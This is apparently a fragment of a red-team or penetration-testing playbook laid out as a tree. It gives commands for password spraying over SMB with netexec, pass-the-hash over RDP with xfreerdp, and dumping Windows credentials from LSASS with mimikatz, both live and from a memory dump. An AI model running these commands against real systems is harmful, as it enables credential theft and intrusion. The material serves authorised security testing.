...
> **Credential handling:** For what to do with any credential you find (PTH, spray, sweep, BloodHound, etc.), see `../operator/CREDENTIAL_DECISION_TREE.md`. This module does not duplicate credential workflows.
...
│   ├── netexec smb target -u users.txt -p 'Spring2026!'
...
│   ├── RDP: xfreerdp /v:target /u:user /pth:hash (⚠ Restricted Admin Mode required)
...
│   │   │   └── Offline: mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
...
│   ├── Windows:
│   │   ├── mimikatz sekurlsa::logonpasswords → Domain user creds
